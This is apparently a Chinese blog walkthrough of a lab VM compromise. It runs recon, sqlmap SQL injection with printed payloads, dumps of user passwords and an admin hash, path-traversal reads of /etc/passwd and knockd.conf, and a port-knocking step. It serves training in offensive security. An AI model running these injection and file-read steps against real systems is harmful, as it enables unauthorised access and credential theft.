-<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nmap -p- 192.168.3.45              </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 17:51 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.45</span><br><span class="line">Host is up (0.00072s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http</span><br><span class="line">MAC Address: 08:00:27:95:4E:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>注意到22端口被<code>filtered</code>了</li>
-</ul>
-<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# dirsearch -u http://192.168.3.45/index.php</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/localkali/testpayload/reports/http_192.168.3.45/_index.php_26-01-10_17-58-52.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.3.45/</span><br><span class="line"></span><br><span class="line">[17:58:52] Starting: index.php/</span><br><span class="line">[17:58:53] 404 -  274B  - /index.php/%2e%2e//google.com</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
-<p>无有用的信息</p>
-<hr>
-<h2 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h2><p>发现search页面，可以输入，推测有注入点<br><img src="/assets/Pasted%20image%2020260110180142.png"><br>注意到post请求，页面url没变，同时burp也有提示post请求，这时有两个方法去测试sqlmap注入<br><img src="/assets/Pasted%20image%2020260110180103.png"></p>
-<hr>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -u http://192.168.3.45/results.php --data <span class="string">&quot;search =1&quot;</span> --leve=5 --batch</span><br></pre></td></tr></table></figure>
-<ul>
-<li>首先<code>url</code>注意是<code>results</code>, 可以看到<code>burp</code>里的<code>post</code>提交路径</li>
-<li>因为是<code>post</code>请求，因此需要加上<code>--data</code>，<code>--level=5</code>检查更严格(可以不加)</li>
-</ul>
-<p>发现<strong>search</strong>注入漏洞</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -u http://192.168.3.45/results.php --data <span class="string">&quot;search=1&quot;</span>  --batch </span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.9.11#stable&#125;</span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 18:09:40 /2026-01-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing if POST parameter &#x27;</span>search<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[18:09:40] [WARNING] POST parameter &#x27;</span>search<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[18:09:40] [WARNING] heuristic (basic) test shows that POST parameter &#x27;</span>search<span class="string">&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing for SQL injection on POST parameter &#x27;</span>search<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Boolean-based blind - Parameter replace (original value)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Oracle AND error-based - WHERE or HAVING clause (XMLType)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Generic inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>PostgreSQL &gt; 8.1 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Microsoft SQL Server/Sybase stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] POST parameter &#x27;</span>search<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] target URL appears to be UNION injectable with 6 columns</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] POST parameter &#x27;</span>search<span class="string">&#x27; is &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">POST parameter &#x27;</span>search<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27;</span> AND (SELECT 6494 FROM (SELECT(SLEEP(5)))FPWe) AND <span class="string">&#x27;ggNh&#x27;</span>=<span class="string">&#x27;ggNh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27;</span> UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162766271,0x44615268716e726b6e4966415575447a42676848597962535a79756e45646241566547736e654f66,0x7170786271),NULL,NULL-- -</span><br><span class="line">---</span><br><span class="line">[18:10:01] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Debian 10 (buster)</span><br><span class="line">web application technology: Apache 2.4.38</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">[18:10:01] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.3.45&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>将<code>burp</code>的抓包直接复制到<code>kali</code>的<code>a.txt</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# cat a.txt </span><br><span class="line">POST /results.php HTTP/1.1</span><br><span class="line">Host: 192.168.3.45</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8</span><br><span class="line">Origin: http://192.168.3.45</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.3.45/search.php</span><br><span class="line">Cookie: PHPSESSID=um35hfg1i6v2rdrtie01kp5u2b</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">search=1</span><br></pre></td></tr></table></figure>
-
-<p>然后用<code>sqlmap -l</code> 指定</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch </span><br><span class="line"><span class="comment">#运行结果上面一致</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="爆破库"><a href="#爆破库" class="headerlink" title="爆破库"></a>爆破库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch --dbs</span><br><span class="line">[18:15:12] [INFO] fetching database names</span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] Staff</span><br><span class="line">[*] <span class="built_in">users</span></span><br></pre></td></tr></table></figure>
-<p>有两个表<code>Staff</code> 和 <code>users</code>，<code>information_schema</code>是<code>mysql</code>自带的不用管 </p>
-<h3 id="查看库中的表"><a href="#查看库中的表" class="headerlink" title="查看库中的表"></a>查看库中的表</h3><p>先看<code>users</code>库，有一个<code>UserDetails</code> 表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch -D <span class="built_in">users</span> --tables</span><br><span class="line">[18:17:09] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;users&#x27;</span></span><br><span class="line">Database: <span class="built_in">users</span></span><br><span class="line">[1 table]</span><br><span class="line">+-------------+</span><br><span class="line">| UserDetails |</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看表中的字段"><a href="#查看表中的字段" class="headerlink" title="查看表中的字段"></a>查看表中的字段</h3><p>先看下 <code>UserDetails</code>表中的字段</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch -D <span class="built_in">users</span> -T UserDetails --columns</span><br><span class="line">[18:21:24] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;UserDetails&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;users&#x27;</span></span><br><span class="line">Database: <span class="built_in">users</span></span><br><span class="line">Table: UserDetails</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| Column    | Type            |</span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| firstname | varchar(30)     |</span><br><span class="line">| <span class="built_in">id</span>        | int(6) unsigned |</span><br><span class="line">| lastname  | varchar(30)     |</span><br><span class="line">| password  | varchar(20)     |</span><br><span class="line">| reg_date  | timestamp       |</span><br><span class="line">| username  | varchar(30)     |</span><br><span class="line">+-----------+-----------------+</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="查看指定字段的数据"><a href="#查看指定字段的数据" class="headerlink" title="查看指定字段的数据"></a>查看指定字段的数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch -D <span class="built_in">users</span> -T UserDetails -C <span class="string">&quot;username,password&quot;</span> --dump</span><br><span class="line"></span><br><span class="line">[18:23:53] [INFO] fetching entries of column(s) <span class="string">&#x27;password,username&#x27;</span> <span class="keyword">for</span> table <span class="string">&#x27;UserDetails&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;users&#x27;</span></span><br><span class="line">Database: <span class="built_in">users</span></span><br><span class="line">Table: UserDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| username  | password      |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| marym     | 3kfs86sfd     |</span><br><span class="line">| julied    | 468sfdfsd2    |</span><br><span class="line">| fredf     | 4sfd87sfd1    |</span><br><span class="line">| barneyr   | RocksOff      |</span><br><span class="line">| tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| jerrym    | B8m#48sd      |</span><br><span class="line">| wilmaf    | Pebbles       |</span><br><span class="line">| bettyr    | BamBam01      |</span><br><span class="line">| chandlerb | UrAG0D!       |</span><br><span class="line">| joeyt     | Passw0rd      |</span><br><span class="line">| rachelg   | yN72#dsd      |</span><br><span class="line">| rossg     | ILoveRachel   |</span><br><span class="line">| monicag   | 3248dsds7s    |</span><br><span class="line">| phoebeb   | smellycats    |</span><br><span class="line">| scoots    | YR3BVxxxw87   |</span><br><span class="line">| janitor   | Ilovepeepee   |</span><br><span class="line">| janitor2  | Hawaii-Five-0 |</span><br><span class="line">+-----------+---------------+</span><br><span class="line"></span><br><span class="line">[18:23:53] [INFO] table <span class="string">&#x27;users.UserDetails&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.3.45/dump/users/UserDetails.csv&#x27;</span></span><br><span class="line">[18:23:53] [INFO] you can find results of scanning <span class="keyword">in</span> multiple targets mode inside the CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/results-01102026_0623pm.csv&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="将数据保存下来"><a href="#将数据保存下来" class="headerlink" title="将数据保存下来"></a>将数据保存下来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ <span class="built_in">cat</span> /root/.local/share/sqlmap/output/192.168.3.45/dump/users/UserDetails.csv | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─<span class="built_in">cat</span> /root/.local/share/sqlmap/output/192.168.3.45/dump/users/UserDetails.csv | awk -F, <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; pass.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# <span class="built_in">cat</span> user.txt                                                                                                  </span><br><span class="line">username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看Staff库"><a href="#查看Staff库" class="headerlink" title="查看Staff库"></a>查看Staff库</h3><p>同样的方法查看<code>Staff</code>库中的数据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -l a.txt -D Staff --tables --batch</span><br><span class="line">[18:30:11] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;Staff&#x27;</span></span><br><span class="line">Database: Staff</span><br><span class="line">[2 tables]</span><br><span class="line">+--------------+</span><br><span class="line">| StaffDetails |</span><br><span class="line">| Users        |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -l a.txt -D Staff -T Users --columns --batch </span><br><span class="line">[18:31:46] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;Users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;Staff&#x27;</span></span><br><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Column   | Type            |</span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Password | varchar(255)    |</span><br><span class="line">| UserID   | int(6) unsigned |</span><br><span class="line">| Username | varchar(255)    |</span><br><span class="line">+----------+-----------------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -l a.txt --batch -D Staff -T Users -C <span class="string">&quot;Username,Password&quot;</span> --dump </span><br><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| Username | Password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</span><br><span class="line">+----------+----------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p><code>password</code>看上去是<code>md5</code>，<code>somd5.com</code>在线爆破一下，结果是<code>transorbital1</code><br><img src="/assets/Pasted%20image%2020260110183639.png"></p>
-<h2 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h2><p>登录进来发现只是多了几个按钮，增加记录，没有什么作用<br><img src="/assets/Pasted%20image%2020260110183945.png"></p>
-<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h3><p>找到<code>file</code>真实路径,下面只是演示<br><img src="/assets/Pasted%20image%2020260110184446.png"><br>手动添加<code>payload</code>, 如<code>../../../etc/passwd</code><br><img src="/assets/Pasted%20image%2020260110184612.png"><br>可以看到在<code>../../../../etc/passwd</code> 时<code>length</code>开始变化, 找到真实路径<br><img src="/assets/Pasted%20image%2020260110184828.png"><br>或者<code>url</code>上面多加一些根目录也是可以的<br><img src="/assets/Pasted%20image%2020260110185038.png"></p>
-<h3 id="etc-ssh-sshd-config"><a href="#etc-ssh-sshd-config" class="headerlink" title="&#x2F;etc&#x2F;ssh&#x2F;sshd_config"></a>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</h3><p>查看<code>etc/ssh/sshd_config</code>配置文件，浏览器搜索<code>root</code>,查看有用的信息，可以发现不允许<code>root</code>远程<code>ssh</code>登录</p>
-<p><img src="/assets/Pasted%20image%2020260110185335.png"></p>
-<h3 id="proc-sched-debug"><a href="#proc-sched-debug" class="headerlink" title="&#x2F;proc&#x2F;sched_debug"></a>&#x2F;proc&#x2F;sched_debug</h3><p>将页面上的数据复制，然后到<code>kali</code> 中，执行<code>vi b.txt</code>, 粘贴进去</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/addrecord.php?file=../../../../proc/sched_debug</span><br></pre></td></tr></table></figure>
-<p><img src="/assets/Pasted%20image%2020260110190422.png"><br>将数据处理后可以看到<code>knockd</code>的服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# <span class="built_in">cat</span> b.txt|egrep <span class="string">&#x27;[a-zA-Z]+&#x27;</span> -o|<span class="built_in">sort</span>|<span class="built_in">uniq</span>  </span><br><span class="line">...</span><br><span class="line">kdevtmpfs</span><br><span class="line">key</span><br><span class="line">khugepaged</span><br><span class="line">khungtaskd</span><br><span class="line">kintegrityd</span><br><span class="line">knockd <span class="comment">#注意这个服务</span></span><br><span class="line">ksmd</span><br><span class="line">ksoftirqd</span><br><span class="line">kstrp</span><br><span class="line">kswapd</span><br><span class="line">kthreadd</span><br><span class="line">kthrotld</span><br><span class="line">ktime</span><br><span class="line">kworker</span><br><span class="line">latency</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>[!NOTE] 命令解释<br> <code>awk -F, &#39;{print $2}&#39;</code> ：<strong>提取第二列</strong>。<code>awk</code>是一个强大的文本处理工具。<code>-F,</code>指定使用<strong>逗号</strong>作为字段分隔符（CSV文件的标准分隔符）。<code>{print $2}</code>表示打印每一行的第二个字段</p>
-</blockquote>
-<h3 id="etc-knockd-conf"><a href="#etc-knockd-conf" class="headerlink" title="&#x2F;etc&#x2F;knockd.conf"></a>&#x2F;etc&#x2F;knockd.conf</h3><p>敲门服务，需要依次对三个端口发送SYN包才能启动</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.45/addrecord.php?file=../../../../etc/knockd.conf</span><br><span class="line"></span><br><span class="line">[options] UseSyslog </span><br><span class="line">[openSSH] sequence = 7469,8475,9842 </span><br><span class="line">seq_timeout = 25 </span><br><span class="line">command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j </span><br><span class="line">ACCEPT tcpflags = syn </span><br><span class="line">[closeSSH] </span><br><span class="line">sequence = 9842,8475,7469 </span><br><span class="line">seq_timeout = 25 </span><br><span class="line">command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j </span><br><span class="line">ACCEPT tcpflags = syn</span><br></pre></td></tr></table></figure>
-
-
-<p>先进行<code>nmap</code>,发现<code>22</code>端口过滤状态，依次执行<code>3</code>次<code>nc</code>命令后，<code>22</code>端口开启</p>
